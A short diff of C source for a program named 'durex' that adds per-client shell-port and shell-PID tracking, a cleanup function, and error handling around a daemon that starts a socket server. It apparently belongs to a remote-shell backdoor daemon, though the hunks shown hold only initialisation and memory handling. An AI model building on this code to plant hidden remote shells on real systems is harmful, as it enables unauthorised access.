@@ -22,9 +22,13 @@ t_durex	*new_durex(void)
 		return (NULL);
 	for (int i = 0; i < MAX_CLIENT; i++)
 	{
-		d->clients[i].pid = -1;
+		d->clients[i].used = false;
 		d->clients[i].socket = -1;
+		d->clients[i].shell_port = -1;
+		d->clients[i].shell_pid = -1;
 	}
+	d->program_path = NULL;
+	d->shell_port = SHELL_START_PORT;
 	return (d);
 }
 
@@ -33,15 +37,29 @@ t_durex	*get_durex(void)
 	return (new_durex());
 }
 
-int durex_daemon(void)
+void	destruct_durex(t_durex *durex)
+{
+	if (durex->program_path != NULL)
+		free(durex->program_path);
+	free(durex);
+}
+
+int durex_daemon(char *program_path)
 {
 	t_durex *durex = get_durex();
 
+	if (durex == NULL)
+		return (1);
+	durex->program_path = strdup(program_path);
 	//HANDLER OF SIGS
 	signal(SIGCHLD, signal_handler);
 	//START SOCKET SERVER
 	if ((durex->socket = new_socket_server(PORT)) == -1)
+	{
+		destruct_durex(durex);
 		return (1);
+	}
 	socket_server_handler(durex);
+	destruct_durex(durex);
 	return 0;
 }
